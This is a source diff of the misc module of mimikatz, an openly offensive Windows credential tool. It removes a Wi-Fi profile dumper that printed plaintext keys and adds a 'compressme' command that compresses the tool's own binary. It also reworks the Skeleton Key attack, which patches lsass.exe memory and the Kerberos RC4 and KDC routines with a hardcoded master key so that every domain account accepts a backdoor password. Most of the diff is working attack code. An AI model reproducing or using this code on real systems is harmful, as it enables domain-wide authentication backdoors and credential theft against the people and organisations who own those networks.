@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_misc.h"
 
@@ -11,69 +11,17 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
 	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
 	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
-	{kuhl_m_misc_wifi,		L"wifi",		NULL},
 #ifdef _M_X64
 	{kuhl_m_misc_addsid,	L"addsid",		NULL},
 #endif
 	{kuhl_m_misc_memssp,	L"memssp",		NULL},
 	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
+	{kuhl_m_misc_compressme,L"compressme",	NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
-	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, kuhl_m_misc_init, kuhl_m_misc_clean
+	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, NULL, NULL
 };
-
-HMODULE kuhl_m_misc_hWlanLib = NULL;
-HANDLE kuhl_m_misc_hWlan = NULL;
-
-PWLANOPENHANDLE WlanOpenHandle = NULL;
-PWLANCLOSEHANDLE WlanCloseHandle = NULL;
-PWLANENUMINTERFACES WlanEnumInterfaces = NULL;
-PWLANGETPROFILELIST WlanGetProfileList = NULL;
-PWLANGETPROFILE WlanGetProfile = NULL;
-PWLANFREEMEMORY WlanFreeMemory = NULL;
-
-NTSTATUS kuhl_m_misc_init()
-{
-	NTSTATUS status = STATUS_SUCCESS;
-	DWORD dwNegoatiatedVersion;
-
-	if(kuhl_m_misc_hWlanLib = LoadLibrary(L"wlanapi"))
-	{
-		WlanOpenHandle = (PWLANOPENHANDLE) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanOpenHandle");
-		WlanCloseHandle = (PWLANCLOSEHANDLE) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanCloseHandle");
-		WlanEnumInterfaces = (PWLANENUMINTERFACES) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanEnumInterfaces");
-		WlanGetProfileList = (PWLANGETPROFILELIST) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanGetProfileList");
-		WlanGetProfile = (PWLANGETPROFILE) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanGetProfile");
-		WlanFreeMemory = (PWLANFREEMEMORY) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanFreeMemory");
-
-		if(!(WlanOpenHandle && WlanCloseHandle && WlanEnumInterfaces && WlanGetProfileList && WlanGetProfile && WlanFreeMemory))
-			status = STATUS_NOT_FOUND;
-		else if(WlanOpenHandle((MIMIKATZ_NT_MAJOR_VERSION < 6) ? 1 : 2, NULL, &dwNegoatiatedVersion, &kuhl_m_misc_hWlan) != ERROR_SUCCESS)
-			status = STATUS_INVALID_PARAMETER;
-
-		if(!NT_SUCCESS(status))
-		{
-			FreeLibrary(kuhl_m_misc_hWlanLib);
-			kuhl_m_misc_hWlanLib = NULL;
-		}
-	}
-	return STATUS_SUCCESS;
-}
-
-NTSTATUS kuhl_m_misc_clean()
-{
-	if(kuhl_m_misc_hWlanLib)
-	{
-		if(kuhl_m_misc_hWlan)
-		{
-			WlanCloseHandle(kuhl_m_misc_hWlan, NULL);
-			kuhl_m_misc_hWlan = NULL;
-		}
-		FreeLibrary(kuhl_m_misc_hWlanLib);
-	}
-	return STATUS_SUCCESS;
-}
 
 NTSTATUS kuhl_m_misc_cmd(int argc, wchar_t * argv[])
 {
@@ -214,7 +162,7 @@ BOOL CALLBACK kuhl_m_misc_detours_callback_process(PSYSTEM_PROCESS_INFORMATION p
 {
 	HANDLE hProcess;
 	PKULL_M_MEMORY_HANDLE hMemoryProcess;
-	DWORD pid = (DWORD) pSystemProcessInformation->UniqueProcessId;
+	DWORD pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
 
 	if(pid > 4)
 	{
@@ -278,55 +226,6 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 	return status;
 }
 
-const wchar_t * KUHL_M_MISC_WIFI_STATE[] = {
-	L"not_ready",
-	L"connected",
-	L"ad_hoc_network_formed",
-	L"disconnecting",
-	L"disconnected",
-	L"associating",
-	L"discovering",
-	L"authenticating",
-};
-NTSTATUS kuhl_m_misc_wifi(int argc, wchar_t * argv[])
-{
-	PWLAN_INTERFACE_INFO_LIST pInterfaceList;
-	PWLAN_PROFILE_INFO_LIST pProfileList;
-	LPWSTR pstrProfileXml;
-	DWORD pdwFlags;
-
-	if(kuhl_m_misc_hWlan)
-	{
-		if(WlanEnumInterfaces(kuhl_m_misc_hWlan, NULL, &pInterfaceList) == ERROR_SUCCESS)
-		{
-			for(pInterfaceList->dwIndex = 0; pInterfaceList->dwIndex < pInterfaceList->dwNumberOfItems; pInterfaceList->dwIndex++)
-			{
-				kprintf(L" * ");
-				kull_m_string_displayGUID(&pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].InterfaceGuid);
-				kprintf(L" / %s - %s\n", KUHL_M_MISC_WIFI_STATE[pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].isState], pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].strInterfaceDescription);
-
-				if(WlanGetProfileList(kuhl_m_misc_hWlan, &pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS)
-				{
-					for(pProfileList->dwIndex = 0; pProfileList->dwIndex < pProfileList->dwNumberOfItems; pProfileList->dwIndex++)
-					{
-						kprintf(L"\t| %s\n", pProfileList->ProfileInfo[pProfileList->dwIndex].strProfileName);
-						pdwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
-						//kprintf(L"%08x\n", pdwFlags);
-						if(WlanGetProfile(kuhl_m_misc_hWlan, &pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].InterfaceGuid, pProfileList->ProfileInfo[pProfileList->dwIndex].strProfileName, NULL, &pstrProfileXml, &pdwFlags, NULL) == ERROR_SUCCESS)
-						{
-							//kprintf(L"%08x\n", pdwFlags);
-							kprintf(L"%s\n", pstrProfileXml);
-							WlanFreeMemory(pstrProfileXml);
-						}
-					}
-					WlanFreeMemory(pProfileList);
-				}
-			}
-			WlanFreeMemory(pInterfaceList);
-		}
-	}
-	return STATUS_SUCCESS;
-}
 #ifdef _M_X64
 BYTE PTRN_JMP[]			= {0xeb};
 BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
@@ -692,9 +591,9 @@ typedef HLOCAL	(WINAPI * PLOCALFREE) (__deref HLOCAL hMem);
 #pragma optimize("", off)
 NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD KeyUsage, PVOID * pContext)
 {
-	NTSTATUS status = 0xC000009A;
+	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
 	PVOID origContext, kiwiContext;
-	BYTE kiwiKey[] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6};
+	DWORD kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	if(*pContext = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, 32 + sizeof(PVOID)))
 	{
 		status = ((PKERB_ECRYPT_INITIALIZE) 0x4343434343434343)(Key, KeySize, KeyUsage, &origContext);
@@ -705,9 +604,9 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 			if(NT_SUCCESS(status))
 			{
 				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) *pContext + 16, kiwiContext, 16);
-				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) *pContext + 32, &Key, sizeof(PVOID));
 				((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(kiwiContext);
 			}
+			*(LPCVOID *) ((PBYTE) *pContext + 32) = Key;
 			((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(origContext);
 		}
 		if(!NT_SUCCESS(status))
@@ -720,9 +619,8 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 }
 NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init_decrypt(PVOID pContext, LPCVOID Data, DWORD DataSize, PVOID Output, DWORD * OutputSize)
 {
-	NTSTATUS status = 0xC000009A;
-	DWORD origOutputSize = *OutputSize;
-	BYTE kiwiKey[] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6};
+	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
+	DWORD origOutputSize = *OutputSize, kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	PVOID buffer;
 	if(buffer = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, DataSize))
 	{
@@ -763,7 +661,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 		{NULL,				NULL,			(PVOID) 0x4444444444444444, NULL}, // Decrypt
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
-
+	BOOL onlyRC4Stuff = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
 	RtlZeroMemory(&orig, sizeof(orig));
 	RtlInitUnicodeString(&orig, newerKey);
 	if(kull_m_process_getProcessIdForName(L"lsass.exe", &processId))
@@ -772,7 +670,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 		{
 			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aLsass.hMemory))
 			{
-				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
+				if(!onlyRC4Stuff)
 				{
 					if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"kdcsvc.dll", &cryptInfos))
 					{
@@ -790,9 +688,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 								RtlZeroMemory(&orig, sizeof(orig));
 								aLsass.address = sMemory.result;
 								if(success = kull_m_memory_copy(&aLsass, &aLocal, sizeof(orig)))
-								{
 									kprintf(L"[KDC] keys patch OK\n");
-								}
 							}
 							else PRINT_ERROR(L"Second pattern not found\n");
 						}
@@ -801,7 +697,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
 				}
 
-				if(success || (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA))
+				if(success || onlyRC4Stuff)
 				{
 					if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"cryptdll.dll", &cryptInfos))
 					{
@@ -818,11 +714,11 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 								aLsass.address = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt - localAddr) + FIELD_OFFSET(KERB_ECRYPT, Initialize);
 								if(kull_m_memory_copy(&aLsass, &aLocal, sizeof(PVOID)))
 								{
-									kprintf(L"[RC4] init patch OK\n", aLsass.address);
+									kprintf(L"[RC4] init patch OK\n");
 									ptrValue += (PBYTE) kuhl_misc_skeleton_rc4_init_decrypt - (PBYTE) kuhl_misc_skeleton_rc4_init;
 									aLsass.address = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt - localAddr) + FIELD_OFFSET(KERB_ECRYPT, Decrypt);
 									if(kull_m_memory_copy(&aLsass, &aLocal, sizeof(PVOID)))
-										kprintf(L"[RC4] decrypt patch OK\n", aLsass.address);
+										kprintf(L"[RC4] decrypt patch OK\n");
 								}
 							}
 							else PRINT_ERROR(L"Unable to create remote functions\n");
@@ -835,6 +731,32 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 			CloseHandle(hProcess);
 		}
 		else PRINT_ERROR_AUTO(L"OpenProcess");
+	}
+	return STATUS_SUCCESS;
+}
+
+#define MIMIKATZ_COMPRESSED_FILENAME	MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"
+NTSTATUS kuhl_m_misc_compressme(int argc, wchar_t * argv[])
+{
+	PBYTE data, compressedData;
+	DWORD size, compressedSize;
+#pragma warning(push)
+#pragma warning(disable:4996)	
+	wchar_t *fileName = _wpgmptr;
+#pragma warning(pop)
+	kprintf(L"Using \'%s\' as input file\n", fileName);
+	if(kull_m_file_readData(fileName, &data, &size))
+	{
+		kprintf(L" * Original size  : %u\n", size);
+		if(kull_m_memory_quick_compress(data, size, (PVOID *) &compressedData, &compressedSize))
+		{
+			kprintf(L" * Compressed size: %u (%.2f%%)\nUsing \'%s\' as output file... ", compressedSize, 100 * ((float) compressedSize / (float) size), MIMIKATZ_COMPRESSED_FILENAME);
+			if(kull_m_file_writeData(MIMIKATZ_COMPRESSED_FILENAME, compressedData, compressedSize))
+				kprintf(L"OK!\n");
+			else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+			LocalFree(compressedData);
+		}
+		LocalFree(data);
 	}
 	return STATUS_SUCCESS;
 }
